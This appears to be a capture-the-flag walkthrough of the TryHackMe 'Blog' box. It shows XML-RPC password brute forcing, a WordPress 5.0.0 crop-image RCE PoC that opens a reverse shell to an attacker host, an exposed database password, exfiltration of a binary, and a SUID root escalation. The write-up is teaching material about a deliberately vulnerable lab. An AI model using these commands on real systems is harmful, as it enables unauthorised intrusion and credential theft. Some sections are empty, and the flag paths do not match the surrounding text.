Blog is a Medium Linux box from TryHackMe themed on Billy Joel's IT blog. The front door is a **WordPress 5.0.0** site — a version deliberately pinned by the *wp-downgrade* plugin so it stays vulnerable to the **crop-image RCE** (**CVE-2019-8942** + **CVE-2019-8943**). After brute-forcing an author's password over XML-RPC, that chain gives a shell as `www-data`. The root step is the interesting part and the reason this writeup exists: a custom SUID binary, `/usr/sbin/checker`, that we pull off the box and **reverse-engineer in Ghidra** to discover it hands out a root shell to anyone who sets a single environment variable.

## Reconnaissance & Enumeration

### Port Scan

A full TCP scan with service and default-script detection. `-p-` covers all 65,535 ports, `-sCV` runs the default NSE scripts plus version detection, and `-Pn` skips host discovery since the box already answered a ping.

```bash
sudo nmap -p- -sCV -Pn -n 10.128.176.76 -oN nmap
```

```bash
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-generator: WordPress 5.0
|_http-title: Billy Joel's IT Blog – The IT blog
| http-robots.txt: 1 disallowed entry
|_/wp-admin/
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: BLOG; OS: Linux
```

Four services: SSH, an Apache-hosted **WordPress 5.0**, and **Samba** on 139/445. The nmap scripts also report the computer name **BLOG** and that SMB allows a `guest` account — worth a look before diving into WordPress.

### SMB Shares — BillySMB

### The blog.thm Virtual Host

Browsing to the site by IP renders a broken, unstyled page — a classic sign the server expects to be reached by a hostname that it uses to build asset URLs:

![Billy Joel's IT Blog loaded by IP, unstyled because its CSS points at blog.thm](/assets/img/THM/Blog/cap1.png)

Viewing the page source confirms it: every resource and feed URL points at **`blog.thm`**.

```html
<link rel="alternate" type="application/rss+xml" title="... Feed" href="http://blog.thm/feed/" />
<link rel="dns-prefetch" href="//blog.thm" />
```

Adding that hostname to `/etc/hosts` makes the site resolve to the box, and now the stylesheet and assets load correctly:

```bash
echo "10.128.176.76 blog.thm" | sudo tee -a /etc/hosts
```

![The blog rendering correctly after adding blog.thm to /etc/hosts](/assets/img/THM/Blog/cap2.png)

The blog posts name two likely users — **Karen Wheeler** and **Billy Joel** — and one post ("A Note From Mom") even hints the author was recently fired and reused personal passwords. The nmap scripts had also flagged a `robots.txt`:

```bash

```

```bash

Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
```

Nothing secret there — just the standard WordPress admin path.

### WordPress: whatweb & wpscan

`whatweb` confirms the stack before the heavier enumeration:

```bash
whatweb http://10.128.176.76
# WordPress 5.0, Apache/2.4.29 (Ubuntu)
```

Then `wpscan` with `-e` (enumerate) fingerprints the theme, plugins and users against the vhost:

```bash
wpscan --url http://blog.thm/ -e
```

Three findings matter:

- **Theme: `twentytwenty`** — the active theme, which the crop-image RCE will write its payload into.
- **Plugin: `wp-downgrade`** — this is the tell. `wp-downgrade` lets an admin pin WordPress to an older release, which is exactly why a box in 2026 is still running the long-patched **5.0.0**: it was downgraded on purpose to stay exploitable.
- **Users: `kwheel` and `bjoel`** — the login names behind Karen Wheeler and Billy Joel.

```bash
[+] kwheel   | Found By: Author Posts - Author Pattern (Passive Detection)
[+] bjoel    | Found By: Author Posts - Author Pattern (Passive Detection)
```

### Password Attack over XML-RPC

With two valid usernames, `wpscan` can brute-force their passwords. It targets WordPress's **XML-RPC** endpoint (`/xmlrpc.php`) by default, which accepts login attempts without the rate-limiting or CAPTCHAs of the web form — making it far faster than `wp-login.php`:

```bash
wpscan --url http://blog.thm/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

```bash
[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - kwheel / cutiepie1
```

So we have **`kwheel : cutiepie1`**. Those credentials don't work over SSH (she's not a Linux user), but they log straight into WordPress:

![Logging into wp-login.php as kwheel](/assets/img/THM/Blog/cap3.png)

## Initial Access — CVE-2019-8942 & CVE-2019-8943 (WordPress 5.0.0 Crop-Image RCE) as `www-data`

WordPress 5.0.0 is vulnerable to a well-known **remote code execution chain** that needs only an *Author*-level account — which `kwheel` has. It combines two bugs:

- **CVE-2019-8942** — an authenticated arbitrary file upload. The `_wp_attached_file` post-meta that records an image's path can be overwritten, so an attacker can control where WordPress thinks an uploaded file lives.
- **CVE-2019-8943** — a path traversal in the `crop-image` action. By cropping that image, WordPress writes the cropped copy to an attacker-controlled path *outside* the uploads directory — for example into the active theme's folder.

Chained together: upload an image with PHP embedded in its metadata, point its path at the Twenty Twenty theme directory via the traversal, crop it so it lands there as an includable file, then request it to execute the PHP. The result is code execution as the web-server user.

A public PoC ([ret2x/poc-wordpress-5.0.0](https://github.com/ret2x/poc-wordpress-5.0.0)) automates every step — authenticate, upload, set the meta, crop into the theme, create a post that includes it, and fire a reverse shell. (Metasploit's `exploit/multi/http/wp_crop_rce` does the same thing if you prefer the framework.)

```bash
python3 poc.py --url http://blog.thm -u kwheel -p cutiepie1 -lhost <ATTACKER_IP> -lport 4444
```

```bash
[+] Login successful
[+] Image uploaded
[*] Including image into theme
[*] Starting listener on 4444
[*] Executing reverse shell
```

The listener catches the shell as `www-data`:

```bash
nc -nlvp 4444
```

```bash
Connection received on 10.128.176.76 46174
www-data@blog:/var/www/wordpress$
```

### TTY & Local Enumeration

After the usual TTY upgrade (`python3 -c 'import pty; pty.spawn("/bin/bash")'`, then `stty raw -echo`), a look around turns up two more dead ends worth recording so you don't sink time into them:

```bash
www-data@blog:/var/www/wordpress$ cat wp-config.php
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
```

Those database credentials only reach the local MySQL instance — there's nothing in it that advances us, and the password isn't reused for a shell user. And Billy's `user.txt` is a troll:

```bash
www-data@blog:/home/bjoel$ cat user.txt
You won't find what you're looking for here.

TRY HARDER
```

The real flags come later. The thing that *does* matter is an unusual SUID binary found while hunting for privilege-escalation vectors:

```bash
www-data@blog:/var/www/wordpress$ find / -perm -4000 2>/dev/null
/usr/bin/passwd
/usr/bin/sudo
...
/usr/sbin/checker
```

Everything in that list is a standard SUID binary except **`/usr/sbin/checker`** — a custom, non-standard executable running with the SUID bit. That is the privilege-escalation path.

## Privilege Escalation — `www-data` → `root` (SUID `checker` Binary)

### Finding and Exfiltrating the Binary

Running `checker` with no context just prints `Not an Admin` and exits — not helpful on its own. Since it's a compiled binary, the quickest way to understand it is to pull it onto our own machine and decompile it. Serve the file from the box with Python's web server and grab it with `curl`:

```bash
# on the target
www-data@blog:/tmp$ cp /usr/sbin/checker . && python3 -m http.server 8000
```

```bash
# on our machine
curl -s http://10.128.176.76:8000/checker -o checker
```

### Installing & Configuring Ghidra

[Ghidra](https://ghidra-sre.org/) is the NSA's open-source reverse-engineering suite. Its headline feature is a **decompiler** that turns a native binary back into readable C-like pseudocode — exactly what we need to see what `checker` is doing. Because I'll come back to this, here is the full first-time setup.

**Download.** Grab the latest release ZIP from the official releases page, [github.com/NationalSecurityAgency/ghidra/releases](https://github.com/NationalSecurityAgency/ghidra/releases). Ghidra is distributed as a self-contained archive — there is no system-wide install — but it requires a matching **JDK** (OpenJDK). Each release lists the exact Java version it needs in its notes and in the project [README](https://github.com/NationalSecurityAgency/ghidra); download that JDK as well if you don't already have it.

**Unpack and launch.** Unzip the release and run the start script from inside the extracted folder:

```bash
unzip ghidra_*_PUBLIC_*.zip
cd ghidra_*_PUBLIC
./ghidraRun
```

If Ghidra can't locate Java on startup, point it at your JDK by exporting `JAVA_HOME=/path/to/jdk` (or by setting the path in `support/launch.properties`).

**Create a project.** On first launch Ghidra shows *NO ACTIVE PROJECT*. Create one with **File → New Project** (Ctrl+N), choose **Non-Shared Project**, and give it a name and a location on disk.

![Ghidra's File menu with New Project selected](/assets/img/THM/Blog/cap4.png)

A Ghidra "project" is just a workspace that holds the binaries you're analysing. The tool that actually opens them is the **CodeBrowser** — the dragon icon in the *Tool Chest*.

![The new Ghidra project with the CodeBrowser tool in the Tool Chest](/assets/img/THM/Blog/cap5.png)

**Import the binary.** Open the CodeBrowser, then use **File → Import File** (shortcut `I`) and select the `checker` file we exfiltrated.

![Importing a file into the Ghidra CodeBrowser](/assets/img/THM/Blog/cap6.png)

Ghidra auto-detects the format. For `checker` it correctly identifies an **ELF**, language `x86:LE:64:default:gcc` (a 64-bit little-endian x86 binary compiled with gcc), so the defaults are right — click **OK**.

![The import dialog showing checker detected as a 64-bit ELF](/assets/img/THM/Blog/cap7.png)

**Analyze.** Ghidra asks whether to analyze the freshly imported file — click **Yes**.

![Ghidra prompting to analyze the imported checker binary](/assets/img/THM/Blog/cap8.png)

The *Analysis Options* dialog lists every analyzer Ghidra can run. For a small binary like this the **Standard Defaults** are exactly what we want, so leave the checkboxes as they are and click **Analyze**.

![The Ghidra analysis options at their standard defaults](/assets/img/THM/Blog/cap9.png)

### Decompiling main()

Once analysis finishes, navigate to the entry logic through the **Symbol Tree** on the left: expand **Functions** and click **main**. The **Decompile** window on the right renders its C pseudocode.

![Ghidra's Symbol Tree, listing and decompiler showing the main function of checker](/assets/img/THM/Blog/cap10.png)

```c
undefined8 main(void)
{
  char *pcVar1;

  pcVar1 = getenv("admin");
  if (pcVar1 == (char *)0x0) {
    puts("Not an Admin");
  }
  else {
    setuid(0);
    system("/bin/bash");
  }
  return 0;
}
```

The logic is trivial once it's readable:

1. `checker` is owned by root and carries the SUID bit, so it runs with root's effective privileges.
2. It reads the **`admin`** environment variable with `getenv`.
3. If that variable is **unset** (`NULL`), it prints `Not an Admin` and quits — which is all we saw earlier.
4. If the variable is **set to anything at all**, it calls `setuid(0)` — which succeeds precisely because the binary is SUID root — and then spawns `/bin/bash`, giving a shell that is now running as root.

The "check" is not a real authorization check; it's satisfied by simply defining the variable.

### Getting root

```bash
www-data@blog:/tmp$ export admin=anything
www-data@blog:/tmp$ /usr/sbin/checker
root@blog:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
```

From root we can read both flags. Billy's home holds the *real* `user.txt` (the earlier one was a decoy), and there's a second copy stashed on a mounted USB:

```bash
root@blog:~# cat /root/root.txt
REDACTED
root@blog:~# cat /media/usb/user.txt
REDACTED
```

## Key Takeaways

- **A downgrade plugin is a vulnerability in a bow.** `wp-downgrade` was the reason a 2026 host still ran WordPress 5.0.0. Pinning software to a deliberately old version to keep a feature (or a CTF) working re-opens every bug fixed since — here, a full RCE chain. Version management is a security control, not just housekeeping.
- **XML-RPC is the soft underbelly of WordPress logins.** The password attack succeeded against `/xmlrpc.php`, which answers login attempts quietly and quickly with none of the web form's throttling. If you don't use it, disable it; if you do, rate-limit it.
- **Recognise rabbit holes early.** The `BillySMB` media files, the `wp-config.php` database password and the fake `user.txt` were all dead ends. Part of working a Medium box efficiently is noting a lead, giving it one honest pass, and moving on rather than forcing it.
- **SUID + a weak check = instant root.** `checker` never needed an exploit — just reading its logic in Ghidra showed the "admin" gate was a single `getenv` away from `setuid(0); system("/bin/bash")`. Any custom SUID-root binary is a high-value target, and a decompiler turns "what does this do?" into a two-minute answer.
- **Decompilation is a core skill, not a last resort.** Pulling an unknown binary off the box and opening it in Ghidra is a repeatable workflow: import, accept the default analysis, read `main`. Being comfortable with it means a strange binary becomes an opportunity instead of a wall.
